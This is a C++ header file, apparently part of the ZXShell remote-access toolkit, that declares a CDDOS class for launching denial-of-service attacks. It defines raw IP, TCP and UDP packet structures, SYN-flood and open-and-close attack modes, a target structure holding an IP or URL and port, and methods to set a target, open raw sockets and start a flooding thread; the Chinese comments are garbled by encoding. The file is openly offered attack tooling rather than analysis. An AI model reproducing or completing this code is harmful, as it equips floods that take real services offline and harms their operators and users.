/*

  Author: LZX

  Create: 2007.06.08
  Update: 2007.06.08

*/


#if !defined _ZX_DDOS
#define _ZX_DDOS


#include <stdio.h> 
#include <winsock2.h> 
#include <time.h> 

#if defined _ZXSHELL

#include "common.h"
#include "..\zxsCommon\debugoutput.h"
#include "..\zxsCommon\zxsWinAPI.h"

#else

#define ZXSAPI
#define __printf printf

char *DNS(char *HostName);

#endif

#pragma  comment(lib,"ws2_32") 

#define IP_HDRINCL      2 /* header is included with data */

#define ETHERTYPE_IP    0x0800
#define ETHERTYPE_ARP   0x0806
#define	ARP_REPLY	 0x0002			/* ARP reply */
#define ARPHRD_ETHER 	1
#define ARP_LEN		 48

#define HEAD_LEN           54
#define TCP_MAXLEN       1460
#define PACKET_MAXLEN    1514
// Э��
#define PROTO_TCP     0x6
#define PROTO_UDP     0x11

typedef BYTE u_char;
typedef BYTE UCHAR;

#pragma pack(push, 1)//ȡ���ڴ��С�Զ�����

typedef struct ip_address
{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;


typedef struct _IPHeader		// 20�ֽڵ�IPͷ
{
    UCHAR     iphVerLen;      // �汾�ź�ͷ���ȣ���ռ4λ��
    UCHAR     ipTOS;          // �������� 
    USHORT    ipLength;       // ����ܳ��ȣ�������IP���ĳ���
    USHORT    ipID;			  // �����ʶ��Ωһ��ʶ���͵�ÿһ�����ݱ�
    USHORT    ipFlags;	      // ��־
    UCHAR     ipTTL;	      // ����ʱ�䣬����TTL
    UCHAR     ipProtocol;     // Э�飬������TCP��UDP��ICMP��
    USHORT    ipChecksum;     // У���
	union {
		unsigned int   ipSource;
		ip_address ipSourceByte;
	};
	union {
		unsigned int   ipDestination;
		ip_address ipDestinationByte;
	};
} IPHeader, *PIPHeader; 

typedef struct _TCPHeader		// 20�ֽڵ�TCPͷ
{
	USHORT	sourcePort;			// 16λԴ�˿ں�
	USHORT	destinationPort;	// 16λĿ�Ķ˿ں�
	ULONG	sequenceNumber;		// 32λ���к�
	ULONG	acknowledgeNumber;	// 32λȷ�Ϻ�
	UCHAR	dataoffset;			// ��4λ��ʾ����ƫ��
	UCHAR	flags;				// 6λ��־λ
								//FIN - 0x01
								//SYN - 0x02
								//RST - 0x04 
								//PUSH- 0x08
								//ACK- 0x10
								//URG- 0x20
								//ACE- 0x40
								//CWR- 0x80

	USHORT	windows;			// 16λ���ڴ�С
	USHORT	checksum;			// 16λУ���
	USHORT	urgentPointer;		// 16λ��������ƫ���� 
} TCPHeader, *PTCPHeader;

typedef struct _udphdr	//����UDP�ײ� 
{ 
	unsigned short uh_sport;	//16λԴ�˿� 
	unsigned short uh_dport;	//16λĿ�Ķ˿� 
	unsigned short uh_len;	//16λ���� 
	unsigned short uh_sum;	//16λУ��� 
}UDPHEADER, *PUDPHeader;

typedef struct _psd
{
    unsigned int   saddr;
    unsigned int   daddr;
    char           mbz;
    char           ptcl;
    unsigned short udpl;
}PSD,*PPSD;

typedef struct _segment
{
    unsigned int   size;
    char           nop[2];
    unsigned short SACKPermitted;
}SEGMENT,*PSEGMENT;


typedef struct _SYNPACKET
{
	IPHeader    iphdr;
	TCPHeader   tcphdr;
	SEGMENT     options;
}SYNPACKET;

typedef struct _ACKPACKET
{
	IPHeader    iphdr;
	TCPHeader   tcphdr;
}ACKPACKET;


#pragma pack(pop)

//AttackMode
#define SYNFLOOD        0
#define OPENANDCLOSE    1
//#define SYNACKOPEN	    2

typedef struct _DDOS_INFORMATION
{
	int hosttype;// 0 == ip, 1 = url
	char szURL[56];
	DWORD m_dwIP;
	WORD m_Port;
	int AttackMode;
	__int64 totalPacketSent;

}DDOS_INFORMATION;


class CDDOS
{

protected:
	SOCKADDR_IN    addr_in;
	SYNPACKET      SYNPacket;

	int m_inited;

	DDOS_INFORMATION ddosinfor;

	SOCKET m_socket;
	DWORD dwThreadId;
	HANDLE hThread;

	int runFlag;

	int mSocketInited;

	char *ErrorString;


	DWORD        srcip; 
	DWORD        seqnum; 
	WORD         srcport,ident; 

	void RefillSYNPacket();

	BOOL FreshDNS();

	static DWORD WINAPI _SendThread(LPVOID lParam);
	DWORD WINAPI SendThread();

public:

	CDDOS();
	virtual ~CDDOS();

	char *GetLastError(){ return ErrorString;}

	BOOL GetStatus(DDOS_INFORMATION *infor);

	BOOL SetTarget(char *szIP, WORD wPort, int attackmode);
	BOOL InitRAWSocket();
	BOOL Start();
	void WaitToQuit();
	BOOL Close();

};







#endif